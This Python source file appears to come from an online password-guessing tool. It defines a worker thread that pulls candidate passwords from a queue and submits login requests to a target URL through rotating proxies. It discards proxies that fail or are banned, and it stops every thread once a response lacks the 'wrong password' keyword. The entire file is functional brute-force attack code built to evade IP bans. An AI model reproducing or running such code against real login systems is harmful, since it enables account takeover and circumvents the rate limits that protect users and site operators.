import threading
from queue import Queue

from requests import exceptions, Response
from sources.proxy import Proxy
import sources.misc as misc
from sources.usernamePassParameter import UsernamePassParameter


# each worker queues polls proxy queue for an available proxy, and then polls password queue
class Worker(threading.Thread):
    def __init__(self,
                 name: str,
                 stop_event: threading.Event,  # raise event when find password match
                 proxy_q: Queue,
                 invalid_proxy_lst: list,
                 url: str,
                 username_pswd_param: UsernamePassParameter,
                 bad_password_resp_keyword: str,
                 banned_ip_resp_keyword,
                 password_queue: Queue,
                 found_password_q: Queue,
                 tried_password_counter: misc.AtomicCounter,
                 is_post_req: bool = True,
                 is_get_req: bool = False
                 ):

        if (is_post_req and is_get_req) or (not is_post_req and not is_get_req):
            raise Exception("worker must set either is_post_req or is_get_req")

        self.thread_name = name
        threading.Thread.__init__(self, name=name)

        if is_post_req:
            self.req_method = 'post'
        else:
            self.req_method = 'get'

        self.url = url
        self.proxy_q = proxy_q
        self.invalid_proxy_lst = invalid_proxy_lst
        self.stop_event = stop_event
        self.username_pswd_param: UsernamePassParameter = username_pswd_param
        self.bad_password_resp_keyword = bad_password_resp_keyword
        self.banned_ip_resp_keyword = banned_ip_resp_keyword
        self.password_queue = password_queue
        self.found_password_q = found_password_q
        self.tried_password_counter = tried_password_counter
        self.get_next_password = True
        self.current_password = ""

    def run(self):
        # make request on proxy with username/ pswd.
        # if fails (dead proxy, blocked ip), retry password with different proxy.
        # continue in infinite loop as long as stop_event not set, or break when pswd queue is empty and finished

        misc.print_stat('{} worker thread starting'.format(self.thread_name), 'magenta')

        self.current_proxy: Proxy = self.proxy_q.get()
        self.proxy_q.task_done()

        while not self.stop_event.is_set() and not self.password_queue.qsize() == 0:
            if self.get_next_password:
                self.current_password = self.password_queue.get()

            if self.proxy_q.qsize() == 0:
                misc.print_error('ran out of valid proxies')
                return
            self.current_proxy = self.proxy_q.get()
            self.proxy_q.task_done()

            params = self.username_pswd_param.gen_param_dict(password=self.current_password)

            try:
                misc.print_stat('attempting password: "{}" thru proxy: {}'.format(self.current_password,
                                                                                  self.current_proxy.proxy_url))
                r = self.current_proxy.make_req(self.req_method,
                                                url=self.url,
                                                params_data=params)
                self.parse_response(r)
                self.get_next_password = True
                self.tried_password_counter.increment()
                self.password_queue.task_done()
                self.proxy_q.put(self.current_proxy)
            except Exception as e:
                try:
                    raise
                except exceptions.ProxyError:
                    misc.print_error('dead proxy: {}'.format(self.current_proxy.proxy_url))
                except Exception as e:
                    misc.print_error('proxy {} timed out'.format(self.current_proxy.proxy_url))
                finally:
                    self.invalidate_proxy(self.current_proxy)
                    self.get_next_password = False  # retry current password

    def is_bad_proxy(self, proxy: Proxy):
        if proxy.proxy_url in self.invalid_proxy_lst:
            return True
        return False

    def invalidate_proxy(self, proxy: Proxy):
        self.invalid_proxy_lst.append(proxy.proxy_url)

    def parse_response(self, resp: Response):
        resp_size = len(resp.content)
        if self.banned_ip_resp_keyword in resp.text:
            self.invalidate_proxy(self.current_proxy)
            misc.print_error('proxy: {} banned'.format(self.current_proxy))
        elif self.bad_password_resp_keyword not in resp.text:
            # username / password match
            # add (username,password) to found_password_q and signal all worker threads to end
            self.found_password_q.put((self.username_pswd_param.username_to_try, self.current_password))
            self.stop_event.set()
            misc.print_positive('response size: {}'.format(resp_size))
        else:
            misc.print_error('tried password: "{}", response size: {}'.format(self.current_password, resp_size))
